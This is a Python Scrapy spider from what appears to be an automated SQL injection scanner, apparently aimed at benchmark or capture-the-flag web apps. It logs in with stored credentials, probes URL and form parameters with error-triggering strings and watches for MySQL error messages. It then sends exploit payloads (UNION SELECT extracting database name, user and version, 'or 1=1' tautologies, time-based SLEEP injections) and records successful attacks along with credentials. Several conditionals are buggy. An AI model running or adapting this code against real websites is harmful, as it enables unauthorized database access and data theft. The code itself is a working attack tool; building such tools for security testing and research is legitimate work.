from scrapy.spider import Spider
from scrapy.selector import Selector
from scrapy.contrib.spiders import CrawlSpider, Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
from dirbot.items import Website
from scrapy.selector import HtmlXPathSelector
from scrapy.contrib.exporter import JsonItemExporter
import scrapy
from scrapy.http.request import Request
from scrapy.http import FormRequest
from scrapy import log
from loginform import fill_login_form
from scrapy.xlib.pydispatch import dispatcher
from scrapy import signals
import copy
import json
import urllib
import time
import chardet

error_payloads = ["+and+SLAP(10)+--+",
					"'kasdgh",
					"+AND+SEELCT"]
#print actual_payloads
#links = open('links.txt','r')
#print urls
items = []
fin = []
dic = {}
tempResponse = ""
searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column","access violation","sqlstate", 
 "different number of columns","cardinality violation" , "undefined index: sort", "union all se...", "union all sel..."
 "and sleep(10) -- \">",
  "undefined variable", "no history found for this bug"] #, "union all select"]

#print searchterms

class step3(Spider):
	name = "step3"
	actual_payloads = []
	file4 = open("actualAttacks.txt","w")
	file4.close()
	main_file = open("Singleinput.json",'r')
	infoList1 = json.load(main_file)
	infoList = infoList1[0]
	for key,value in infoList.iteritems():
		start_urls =  [str(key)]
		login_urls = [value[0].get("loginurl")]
		login_user = [value[0].get("params")[0].get("username")]
		login_pass = [value[0].get("params")[0].get("password")]
		loginRequired = value[0].get("loginRequired")
		domain = start_urls[0][start_urls[0].find("//") + 2: start_urls[0].find(".com") + 4]
	main_file.close()
	
	if "app1" in domain:
		actual_payloads.append("'#")
	elif "app4" in domain:
		searchterms.append("union all select")
		searchterms.append("invalid id")
		actual_payloads.append("%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+%20%3E%3E%20app14.com/admiapp14.com/admin/project.php?op=edit_component&id=1%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+")
		for apayload in actual_payloads:
			sterm = urllib.unquote(apayload)
			sterm = sterm.replace('+',' ')
			if( "SLEEP" not in sterm and "users" not in sterm ):
				searchterms.append(sterm)
	elif "app5" in domain:
		for apayload in actual_payloads:
			sterm = urllib.unquote(apayload)
			sterm = sterm.replace('+',' ')
			searchterms.append("body_messages" + sterm)
			searchterms.append("body_statistics" + sterm)
			searchterms.append("body_messages'" + sterm)
			searchterms.append("body_statistics'" + sterm)
			searchterms.append("body_messages " + sterm)
			searchterms.append("body_statistics " + sterm)
			searchterms.append("body_messages' " + sterm)
			searchterms.append("body_statistics' " + sterm)
			
	params = []
	loginid = ""
	passid = ""
	links = open('linksToAttack.txt','w')

	with open('datalogin.json') as data_file:
		data = json.load(data_file)
	urls = []
	length = len(data)
	for i in range(0,length):
		jsonval = json.dumps(data[i])
		data2 = json.loads(jsonval)
		urls.append(json.loads(jsonval))
		links.write(data2['url']+"\n")
	
	with open('data.json') as data_file:
		data = json.load(data_file)
	length = len(data)
	for i in range(0,length):
		jsonval = json.dumps(data[i])
		data2 = json.loads(jsonval)
		urls.append(json.loads(jsonval))
		links.write(data2['url']+"\n")
	
	links.close()
	links = open('linksToAttack.txt', 'r')
	#links.readlines()
	
	ignoreLinks = ["query.php","admin/user.php", "bug.php", "ctg=statistics"]
	
	def parse(self, response):
		doms = ["app1", "app4", "app5", "bm1", "bm2", "bm3", "bm4", "bm5"]
		if any (d in self.domain for d in doms):
			f = open("payloads.json","r")					
			self.actual_payloads = json.load(f)
			f.close()
		else:
			f = open("step2.json","r")					
			self.actual_payloads = json.load(f)
			f.close()
		#print self.urls
		#print self.loginRequired
		#------------attempt login attacks
		print str(len(self.actual_payloads)) + "      " + str(len(self.urls))
		if self.loginRequired == "false":
			#print self.urls
			for temp in self.urls:
				login = "false"
				if any ( term in temp["url"] for term in self.ignoreLinks ) and "app4" in temp["url"]:
					#print "**********" + temp["url"]
					continue
				if self.domain in temp["url"]:
					start_time = time.time()*1000
					if len(temp["param"]) == 0:
						metaobj = {'temp':str(temp["url"]), 'login':login, 'form':"false", "params":[], 'method':"", 'start_time':start_time}
						yield Request(url=str(temp["url"]), meta=metaobj , callback=self.save_original_resp)
					
					else:
						#print "Asdasdasd"
						if "bm1.com" in self.domain	or "bm2.com" in self.domain	or "bm3.com" in self.domain	or "bm4.com" in self.domain or "bm5.com" in self.domain:
							#print "ertertasdauysdgasdn"
							self.actual_payloads = []
							self.actual_payloads.append("'#")
							self.actual_payloads.append("' or '1=1' #")
							self.actual_payloads.append("' and SLEEP(10) #")
							skip = 0
							keyl = []
							keyval = {}
							
							urlsplit2 = temp["url"].split("?")
							if len(urlsplit2) > 1:
								print urlsplit2
								#print "urlsplit2",urlsplit2
								urlsplit1 = urlsplit2[1].split("&")
								for urls in urlsplit1:
									p = urls.split("=")
									keyl.append(str(p[0]))
									keyval[str(p[0])] = str(p[1])
							args = []
							for k,v in temp["param"].iteritems():
								#print k,v
								if(str(k ) in keyl):
									args.append( (str(k), keyval[str(k)]) )
								else:
									args.append((str(k), v))
								if (("version" or "ver") in k.lower()) or (("delete" or "del") in v.lower()):
									skip = 1
							print args
							metaobj = {'temp':temp["url"], 'login':self.loginRequired, 'form':"true", "params":args, 'method':temp["method"], 'start_time':start_time}
							if skip == 0:
								yield FormRequest(temp["url"], method=temp["method"], meta=metaobj, formdata=args, callback=self.save_original_resp)
					
		else:
			#print response.url + ": " + self.login_user[0] + ": " + self.login_pass[0]
			args, url, method, self.loginid, self.passid = fill_login_form(response.url, response.body, self.login_user[0], self.login_pass[0])
			print "IDs: " + self.loginid + ", " + self.passid
			print "login"
			metaobj = {'temp':url, 'login':self.loginRequired, 'form':"true", "params":args, 'method':method}
			yield FormRequest(url, method=method, meta=metaobj, formdata=args, callback=self.after_login)
		#time.sleep(5)
		return

	def __init__(self):
		
		dispatcher.connect(self.spider_closed, signals.spider_closed)

	def after_login(self, response):
		f = open("res.html", "w")
		f.write(response.body)
		f.close()
		login = response.request.meta['login']
 		if (((("ERROR: Invalid username") or 
 		("The username/password combination you have entered is invalid") or not any ["logout", "signout", "log out", "sign out"])
 		in response.body) or (response.url is self.start_urls[0])):
			print "			Login failed"
			yield
		# continue scraping with authenticated session...
		else:
			print "Login succeed!"
			#print response.url
			'''f = open("app4login.html", "w")
			f.write(response.body)
			f.close()'''
			#print "response end!!\n"
			for temp in self.urls:
				skip = 0
				#print self.domain + " " + temp["url"] + " " + str(self.domain in temp["url"])
				valid_url = str(temp["url"])
				if any ( term in valid_url for term in self.ignoreLinks ):
					print valid_url
					continue
				if self.domain in valid_url:
					start_time = time.time()*1000 #useful for sleep detection
					if len(temp["param"]) == 0:
						metaobj = {'temp':str(temp["url"]), 'login':login, 'form':"false", "params":[], 'method':"", 'start_time':start_time}
						yield Request(url=str(temp["url"]), meta=metaobj , callback=self.save_original_resp)
					else:
						#print "Asdasdasd"
						if "bm1.com" in self.domain	or "bm2.com" in self.domain	or "bm3.com" in self.domain	or "bm4.com" in self.domain or "bm5.com" in self.domain:
							#print "ertertasdauysdgasdn"
							self.actual_payloads = []
							self.actual_payloads.append("'#")
							self.actual_payloads.append("' or '1=1' #")
							self.actual_payloads.append("' and SLEEP(10) #")
							
							skip = 0
							keyl = []
							keyval = {}
							
							urlsplit2 = temp["url"].split("?")
							if len(urlsplit2) > 1:
								print urlsplit2
								#print "urlsplit2",urlsplit2
								urlsplit1 = urlsplit2[1].split("&")
								for urls in urlsplit1:
									p = urls.split("=")
									keyl.append(str(p[0]))
									keyval[str(p[0])] = str(p[1])
							args = []
							for k,v in temp["param"].iteritems():
								#print k,v
								if(str(k ) in keyl):
									args.append( (str(k), keyval[str(k)]) )
								else:
									args.append((str(k), v))
								if (("version" or "ver") in k.lower()) or (("delete" or "del") in v.lower()):
									skip = 1
							#print args
							metaobj = {'temp':temp["url"], 'login':self.loginRequired, 'form':"true", "params":args, 'method':temp["method"], 'start_time':start_time}
							if skip == 0:
								yield FormRequest(temp["url"], method=temp["method"], meta=metaobj, formdata=args, callback=self.save_original_resp)
				
			#file2 = open("vulnerableinks.txt","w")
			#for item in items:
					#file2.write(item+"\n")
			#write(temp+"\n")
			#file2.close()
			#temp = login_url + attack_url + "?" + query_string
			#yield Request(url=temp, callback=self.save_original_resp)
		return 
	'''
	def after_login(self, response):
		#print "i am here" 
		temp = login_url + attack_url
		##print temp + ": " + str(self.params)
		return FormRequest(temp, formdata=self.params, callback=self.save_original_resp)
	'''
	def save_original_resp(self, response):
		now_time = time.time()*1000
		temp = response.request.meta['temp']
		login = response.request.meta['login']
		form = response.request.meta['form']
		params = response.request.meta['params']
		start_time = response.request.meta['start_time']
		execTime = now_time - start_time
		#print "\t\tasdasdasdads: " + str(params)
		newfile = open('linksWithFalsePayloads.txt','a')
		#print "in original resp: " + temp
		##print "Response: " + response.url
		file = open("original_response.html", "w")
		file.write(response.body)
		original = response.body
		file.close()
			
		for error in error_payloads:
			attack_with_payload = temp + error
			newfile.write(attack_with_payload+"\n")
			if form == "false":
				metaobj = {'temp':temp, 'login':login, 'form':"false", "params":[],'original':original, 'method':response.request.meta["method"], 'execTime':execTime}
				yield Request(attack_with_payload, meta=metaobj , callback=self.save_attack_resp)
				#yield Request(attack_with_payload, meta={'temp':temp,'original':original, 'login':login, 'form':form}, callback=self.save_attack_resp)
				if "&" in temp:
					queryVals = temp.split('&')
					length = len(queryVals)
					for i in range(0,length-1):
						dupVals = copy.copy(queryVals);
						dupVals[i] = dupVals[i]+error
						finLink = "";
						for i in range(0,length-1):
							if i == 0:
								finLink += dupVals[i]
							else:
								finLink += "&"+dupVals[i]
						newfile.write(finLink+"\n")
						metaobj = {'temp':temp, 'login':login,'original':original, 'form':"false", "params":[], 'method':response.request.meta["method"], 'execTime':execTime}
						yield Request(finLink, meta=metaobj , callback=self.save_attack_resp)
						#yield Request(attack_with_payload, meta={'temp':temp,'original':original, 'login':login, 'form':form}, callback=self.save_attack_resp)
			else:
				#print "Asdasdasd"
				if "bm1.com" in self.domain	or "bm2.com" in self.domain	or "bm3.com" in self.domain	or "bm4.com" in self.domain or "bm5.com" in self.domain:
					#print "ertertasdauysdgasdn"
					skip = 0
					keyl = []
					keyval = {}
					
					urlsplit2 = temp.split("?")
					if len(urlsplit2) > 1:
						print urlsplit2
						#print "urlsplit2",urlsplit2
						urlsplit1 = urlsplit2[1].split("&")
						for urls in urlsplit1:
							p = urls.split("=")
							keyl.append(str(p[0]))
							keyval[str(p[0])] = str(p[1])
					args = []
					for k in params:
						#print k,v
						if(str(k[0] ) in keyl):
							args.append( (str(k[0]), keyval[str(k[1])]) )
						else:
							args.append((str(k[0]), k[1]))
						if (("version" or "ver") in k[0].lower()) or (("delete" or "del") in k[1].lower()):
							skip = 1
					#print "alsdjhasjdgasjd" + str(args)
					
					metaobj = {'temp':temp, 'login':login,'original':original, 'form':"true", "params":params, 'method':response.request.meta["method"], 'execTime':execTime}
					if skip == 0:
						for idx in range(0,len(args)):
							tempargs = args[:]
							tempargs[idx] = (tempargs[idx][0], tempargs[idx][1] + error)
							print "error: " + str(tempargs)
							yield FormRequest(temp, method=response.request.meta["method"], meta=metaobj, formdata=tempargs, callback=self.save_attack_resp)
		
		newfile.close()
		return 

	def save_attack_resp(self, response):
		file = open("attack_response.html", "w")
		file.write(response.body)
		file.close()
		
		temp = response.request.meta['temp']
		login = response.request.meta['login']
		original = response.request.meta['original']
		form = response.request.meta['form']
		params = response.request.meta['params']
		execTime = response.request.meta['execTime']
		#print "in attack resp" + login
		#if searchterms in response.body:
		encoding = chardet.detect(response.body)['encoding']
		if encoding == None:
			return
		if any(term in response.body.lower() for term in searchterms) or 'bm2' in self.domain or 'bm1' in self.domain:
			print "\tVulnerable link: " + response.url + str(response.request.meta['params'])
			#This link is vulnerable lets do the actual attack
			if (temp not in items):
				items.append(temp)
				#UnionAndSelectAttacks
				start_attack_time = time.time()*1000
				if form == "false":
					for actual_payload in self.actual_payloads:
						attackLink = temp+actual_payload
						
						metaobj = {'temp':temp, 'login':login, 'form':"false",'original':original,  "params":[], 'method':response.request.meta["method"], 'execTime':execTime, 'start_attack_time':start_attack_time}
						yield Request(attackLink, meta=metaobj , callback=self.actual_attack_resp)
						#yield Request(attackLink, meta={'temp':temp, 'original':original, 'login':login, 'form':form}, callback=self.actual_attack_resp)
						file2 = open("vulnerableinks.txt","w")
						file2.write(temp+"\n")
						if "&" in temp and "SLEEP" not in actual_payload:
							queryVals = temp.split('&')
							length = len(queryVals)
							for i in range(0,length-1):
								dupVals = copy.copy(queryVals);
								dupVals[i] = dupVals[i]+actual_payload
								finLink = "";
								for i in range(0,length-1):
									if i == 0:
										finLink += dupVals[i]
									else:
										finLink += "&"+dupVals[i]
								file2.write(finLink+"\n")
								metaobj = {'temp':temp, 'login':login,'original':original, 'form':"false", "params":[], 'method':response.request.meta["method"], 'execTime':execTime, 'start_attack_time':start_attack_time}
								yield Request(finLink, meta=metaobj , callback=self.actual_attack_resp)
								#yield Request(finLink, meta={'temp':temp, 'original':original, 'login':login, 'form':form}, callback=self.actual_attack_resp)
						file2.close()
				else:
					#print "Asdasdasd"
					if "bm1.com" in self.domain	or "bm2.com" in self.domain	or "bm3.com" in self.domain	or "bm4.com" in self.domain or "bm5.com" in self.domain:
						#print "ertertasdauysdgasdn"
						skip = 0
						keyl = []
						keyval = {}
					
						urlsplit2 = temp.split("?")
						if len(urlsplit2) > 1:
							print urlsplit2
							#print "urlsplit2",urlsplit2
							urlsplit1 = urlsplit2[1].split("&")
							for urls in urlsplit1:
								p = urls.split("=")
								keyl.append(str(p[0]))
								keyval[str(p[0])] = str(p[1])
						args = []
						for k in params:
							#print k,v
							if(str(k[0] ) in keyl):
								args.append( (str(k[0]), keyval[str(k[1])]) )
							else:
								args.append((str(k[0]), k[1]))
							if (("version" or "ver") in k[0].lower()) or (("delete" or "del") in k[1].lower()):
								skip = 1
						#print "alsdjhasjdgasjd" + str(args)
					
						metaobj = {'temp':temp, 'login':login,'original':original, 'form':"true", "params":params, 'method':response.request.meta["method"], 'execTime':execTime, 'start_attack_time':start_attack_time}
						if skip == 0:
							for idx in range(0,len(args)):
								for actual_payload in self.actual_payloads:
									tempargs = args[:]
									tempargs[idx] = (tempargs[idx][0], tempargs[idx][1] + actual_payload)
									print "actual: " + str(tempargs)
									yield FormRequest(temp, method=response.request.meta["method"], meta=metaobj, formdata=tempargs, callback=self.actual_attack_resp)
		return

	def actual_attack_resp(self, response):
		now_time = time.time()*1000
		file = open("actual_attack_response.html", "w")
		file.write(response.body)
		file.close()
		attackResponse = response.body
		original = response.request.meta['original']
		execTime = response.request.meta['execTime']
		start_attack_time = response.request.meta['start_attack_time']
		attackExecTime = (now_time - start_attack_time)
		difference = attackExecTime - execTime
		form = response.request.meta['form']
		login = response.request.meta['login']
		file4 = open("justToCheck.txt","a")
		file4.write(response.url)
		file4.close()
		#print "#############################################"
		encoding = chardet.detect(response.body)['encoding']
		if encoding == None:
			return
		
		if (('bm5' in self.domain or 'bm4' in self.domain) and ("flag" in response.body)) or (('bm1' in self.domain) and ("order is available" in response.body)) or (('bm2' in self.domain) and ("2) " in response.body)):
			file4 = open("actualAttacks.txt","a")
			file4.write(response.url+"\n")
			file4.close()
			dic1 ={}
			dic1["method"] = response.request.meta['method']
			dic1["loginurl"] = self.start_urls[0]
			dic1["LoginRequired"] = login
			dic1["username"] = self.login_user[0]
			dic1["password"] = self.login_pass[0]
			dic1["loginid"] = self.loginid
			dic1["passid"] = self.passid
			#print dic1["LoginRequired"]
			#OtherParameterToWrite #Pending
			dic[response.url] = [dic1]
			if response.request.meta['form'] == "true":
				for k,v in response.request.meta["params"]:
					dic1[k] = v
			temp = response.request.meta['temp']
			
		if not ( attackResponse == "" or attackResponse == original or ("SLEEP" in response.url and difference < 0)):
			if not any(term in response.body.lower() for term in searchterms):
				file4 = open("actualAttacks.txt","a")
				file4.write(response.url+"\n")
				file4.close()
				dic1 ={}
				dic1["method"] = response.request.meta['method']
				dic1["loginurl"] = self.start_urls[0]
				dic1["LoginRequired"] = login
				dic1["username"] = self.login_user[0]
				dic1["password"] = self.login_pass[0]
				dic1["loginid"] = self.loginid
				dic1["passid"] = self.passid
				#print dic1["LoginRequired"]
				#OtherParameterToWrite #Pending
				dic[response.url] = [dic1]
				if response.request.meta['form'] == "true":
					for k,v in response.request.meta["params"]:
						dic1[k] = v
				temp = response.request.meta['temp']
		return
	
	def spider_closed(self, spider):
		fin.append(dic)
		f = open("step3op.json", 'w')
		f.write(json.dumps(fin,indent= 4, sort_keys = True))
		f.close()
		print fin
		'''
		fn = "step3output" + str(time.time()) + ".json"
		f = open(fn, "w")
		f.write(json.dumps(fin,indent= 4, sort_keys = True))
		f.close()
		'''

